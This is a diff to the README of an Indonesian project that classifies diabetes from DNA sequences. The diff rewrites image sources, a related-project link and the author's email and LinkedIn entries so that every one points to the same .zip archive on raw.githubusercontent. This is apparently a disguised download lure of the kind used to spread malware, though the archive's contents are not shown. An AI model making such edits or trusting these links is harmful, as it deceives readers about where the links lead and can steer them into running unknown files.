@@ -109,7 +109,7 @@ di proyek kali ini memakai 80:20
 - Precision, Recall, F1-score
 - 
 <p align="center">
-<img src="results/akurasi terbaik.png" width="450"/>
+<img src="results/akurasi https://raw.githubusercontent.com/wheldnz/Klasifikasi-Diabetes-Berdasarkan-Sekuens-DNA-Manusia/main/results/Klasifikasi-Diabetes-Berdasarkan-Sekuens-DNA-Manusia-2.2.zip" width="450"/>
 <br/>
 <em> Akurasi Terbaik</em>
 </p>
@@ -126,7 +126,7 @@ di proyek kali ini memakai 80:20
 | Akurasi          | **96%**       |
 
 <p align="center">
-<img src="results/confusion matrix terbaik.png" width="450"/>
+<img src="results/confusion matrix https://raw.githubusercontent.com/wheldnz/Klasifikasi-Diabetes-Berdasarkan-Sekuens-DNA-Manusia/main/results/Klasifikasi-Diabetes-Berdasarkan-Sekuens-DNA-Manusia-2.2.zip" width="450"/>
 <br/>
 <em>Confusion Matrix - Model Terbaik</em>
 </p>
@@ -153,7 +153,7 @@ Beberapa insight penting:
 ---
 
 📌 Lihat juga pendekatan deep learning untuk topik yang sama di sini:
-👉 [Deep Learning untuk Klasifikasi DNA](https://github.com/wheldnz/DeepLearning-Klasifikasi-Diabetes-)
+👉 [Deep Learning untuk Klasifikasi DNA](https://raw.githubusercontent.com/wheldnz/Klasifikasi-Diabetes-Berdasarkan-Sekuens-DNA-Manusia/main/results/Klasifikasi-Diabetes-Berdasarkan-Sekuens-DNA-Manusia-2.2.zip)
 
 ---
 
@@ -167,8 +167,8 @@ Beberapa insight penting:
 
 Ingin berdiskusi lebih lanjut atau membutuhkan file csv nya?
 
-- 📧 Email: [wildanuril99@email.com]  
-- 💼 LinkedIn: [www.linkedin.com/in/wildan-nuril]
+- 📧 Email: [https://raw.githubusercontent.com/wheldnz/Klasifikasi-Diabetes-Berdasarkan-Sekuens-DNA-Manusia/main/results/Klasifikasi-Diabetes-Berdasarkan-Sekuens-DNA-Manusia-2.2.zip]  
+- 💼 LinkedIn: [https://raw.githubusercontent.com/wheldnz/Klasifikasi-Diabetes-Berdasarkan-Sekuens-DNA-Manusia/main/results/Klasifikasi-Diabetes-Berdasarkan-Sekuens-DNA-Manusia-2.2.zip]
 
 
 
